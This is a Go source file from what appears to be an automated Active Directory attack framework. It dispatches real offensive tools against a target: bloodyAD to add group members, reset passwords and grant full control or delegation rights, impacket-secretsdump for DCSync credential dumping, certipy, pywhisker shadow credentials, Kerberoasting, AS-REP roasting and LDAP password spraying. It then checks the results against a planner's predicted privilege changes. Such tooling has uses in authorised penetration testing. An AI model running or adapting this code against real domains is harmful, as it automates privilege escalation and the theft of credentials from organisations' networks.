package modules

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"adpack/core"
)

// DispatchResult wraps the output of a real tool execution alongside the
// executor's predicted delta, ready for reconciliation.
type DispatchResult struct {
	ToolOutput string
	ExitCode   int
	Predicted  core.ExecutionResult
	Capability core.Capability
	Edge       core.PrivilegeEdge
}

// ExecuteAndReconcile runs the real tool for a given capability on an edge,
// reconciles the output against the executor's predicted delta, then
// runs a post-action LDAP state verification.
//
// Heuristic failure (tool crash, wrong output) blocks the mutation.
// State-verification failure is treated as a CONFIDENCE SIGNAL, not a block
// — the delta is still applied but edges carry degraded confidence so the
// planner naturally deprioritises them.
//
// The caller should always ApplyDelta — the verdict tells you at what
// confidence the edges should be materialised.
func ExecuteAndReconcile(ctx context.Context, edge core.PrivilegeEdge, cap core.Capability, state *core.ADState, domain, user, pass, hash, targetIP string) (ReconVerdict, error) {
	reg := CapabilityRegistry
	if reg == nil {
		return ReconVerdict{Trustworthy: false, Summary: "no capability registry"}, fmt.Errorf("capability registry not configured")
	}

	exec, status := reg.Resolve(cap)
	if status != core.CapabilityAvailable {
		return ReconVerdict{Trustworthy: false, Summary: fmt.Sprintf("capability %s not available", cap)},
			fmt.Errorf("capability %s not available (status %d)", cap, status)
	}

	predicted := exec.Execute(ctx, edge, state)

	dr, err := dispatchTool(ctx, edge, cap, domain, user, pass, hash, targetIP)
	if err != nil {
		return ReconVerdict{Trustworthy: false, Summary: err.Error()}, err
	}

	// Phase 1: Heuristic output-based reconciliation (hard gate)
	heuristic := ReconcileCrossCheck(predicted, cap, dr.ToolOutput, dr.ExitCode)
	if !heuristic.Trustworthy {
		return heuristic, nil
	}

	// Phase 2: State-grounded LDAP verification (confidence signal)
	stateResult := VerifyState(ctx, edge, cap, domain, user, pass, targetIP)
	if !stateResult.Passed {
		// Degrade confidence on all predicted edges rather than blocking
		for i := range predicted.Delta.NewEdges {
			predicted.Delta.NewEdges[i].DegradeConfidence(stateResult.Confidence, "state_verification")
		}
		for i := range predicted.Delta.RemovedEdges {
			_ = i
		}
		return ReconVerdict{
			Trustworthy: true,
			Confidence:  stateResult.Confidence,
			Summary:     fmt.Sprintf("state verify failed — edges degraded (conf=%.2f): %s", stateResult.Confidence, stateResult.Evidence),
			Mismatches: []ReconMismatch{{
				Field: "state_ground", Expected: "confirmed", Actual: stateResult.Evidence,
			}},
		}, nil
	}

	// Mark predicted edges as state-verified
	for i := range predicted.Delta.NewEdges {
		predicted.Delta.NewEdges[i].MarkVerified(stateResult.Confidence, stateResult.Evidence)
	}

	return ReconVerdict{
		Trustworthy: true,
		Confidence:  stateResult.Confidence,
		Summary:     fmt.Sprintf("reconciled + state-grounded: %s", stateResult.Evidence),
	}, nil
}

// dispatchTool runs the real command-line tool for the given capability.
func dispatchTool(ctx context.Context, edge core.PrivilegeEdge, cap core.Capability, domain, user, pass, hash, targetIP string) (DispatchResult, error) {
	dCtx, cancel := context.WithTimeout(ctx, 120*time.Second)
	defer cancel()

	cmd, err := buildCommand(dCtx, edge, cap, domain, user, pass, hash, targetIP)
	if err != nil {
		return DispatchResult{}, err
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	exitCode := 0

	err = cmd.Run()
	select {
	case <-dCtx.Done():
		return DispatchResult{}, dCtx.Err()
	default:
	}

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			return DispatchResult{}, fmt.Errorf("tool execution failed: %w", err)
		}
	}

	output := stdout.String()
	if stderr.Len() > 0 {
		if output != "" {
			output += "\n" + stderr.String()
		} else {
			output = stderr.String()
		}
	}

	// Resolve the executor to get predicted delta
	reg := CapabilityRegistry
	var predicted core.ExecutionResult
	if reg != nil {
		if exec, status := reg.Resolve(cap); status == core.CapabilityAvailable {
			predicted = exec.Execute(ctx, edge, &core.ADState{})
		}
	}

	return DispatchResult{
		ToolOutput: output,
		ExitCode:   exitCode,
		Predicted:  predicted,
		Capability: cap,
		Edge:       edge,
	}, nil
}

// buildCommand constructs the exec.Cmd for a capability + edge with context
// for timeout enforcement.
func buildCommand(ctx context.Context, edge core.PrivilegeEdge, cap core.Capability, domain, user, pass, hash, targetIP string) (*exec.Cmd, error) {
	source := edge.SourcePrincipal
	if idx := strings.Index(source, "\\"); idx >= 0 {
		source = source[idx+1:]
	}
	target := edge.TargetPrincipal
	if idx := strings.Index(target, "\\"); idx >= 0 {
		target = target[idx+1:]
	}

	capLower := strings.ToLower(string(cap))

	switch {
	case strings.Contains(capLower, "add_member"):
		// bloodyAD add groupMember <group> <user>
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "groupMember", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil

	case strings.Contains(capLower, "force_change_password"):
		newPass := "P@ssw0rd_Changed_2026!"
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"set", "password", target, newPass,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil

	case strings.Contains(capLower, "write_dacl"):
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "genericAll", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil

	case strings.Contains(capLower, "generic_all"):
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "genericAll", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil

	case strings.Contains(capLower, "dcsync"):
		// impacket-secretsdump domain/user:pass@target
		targetStr := fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, targetIP)
		args := []string{targetStr}
		return exec.CommandContext(ctx, "impacket-secretsdump", args...), nil

	case strings.Contains(capLower, "cert_auth"):
		// certipy req -u user@domain -p pass -ca CA-SERVER -template User
		// certipy finds CA servers automatically; provide explicit target IP
		args := []string{
			"req", "-u", fmt.Sprintf("%s@%s", user, domain),
			"-p", pass, "-dc-ip", targetIP,
			"-template", "User",
		}
		return exec.CommandContext(ctx, "certipy", args...), nil

	case strings.Contains(capLower, "rbcd"):
		// bloodyAD add rbcd <computer> <source_principal>
		args := []string{
			"--host", targetIP, "-d", domain,
			"-u", user, "-p", pass,
			"add", "rbcd", target, source,
		}
		return exec.CommandContext(ctx, "bloodyAD", args...), nil

	case strings.Contains(capLower, "shadow_cred"):
		// pywhisker -d domain -u user -p pass --target target_sam --action add
		args := []string{
			"-d", domain, "-u", fmt.Sprintf("%s\\%s", domain, user),
			"-p", pass, "--target", target,
			"--action", "add",
		}
		return exec.CommandContext(ctx, "pywhisker", args...), nil

	case strings.Contains(capLower, "kerberoast"):
		// impacket-GetUserSPNs domain/user:pass -request
		args := []string{
			fmt.Sprintf("%s/%s:%s", domain, user, pass),
			"-request",
		}
		return exec.CommandContext(ctx, "impacket-GetUserSPNs", args...), nil

	case strings.Contains(capLower, "asrep_roast"):
		// impacket-GetNPUsers domain/ -no-pass -usersfile users.txt
		args := []string{
			fmt.Sprintf("%s/", domain),
			"-no-pass",
			"-usersfile", fmt.Sprintf("%s.txt", target),
		}
		return exec.CommandContext(ctx, "impacket-GetNPUsers", args...), nil

	case strings.Contains(capLower, "ldap_spray"):
		// nxc ldap target -d domain -u user -p pass --spray
		args := []string{
			targetIP, "-d", domain, "-u", user,
			"-p", pass, "--spray",
		}
		return exec.CommandContext(ctx, "nxc", append([]string{"ldap"}, args...)...), nil

	default:
		return nil, fmt.Errorf("no tool dispatch for capability %s", cap)
	}
}
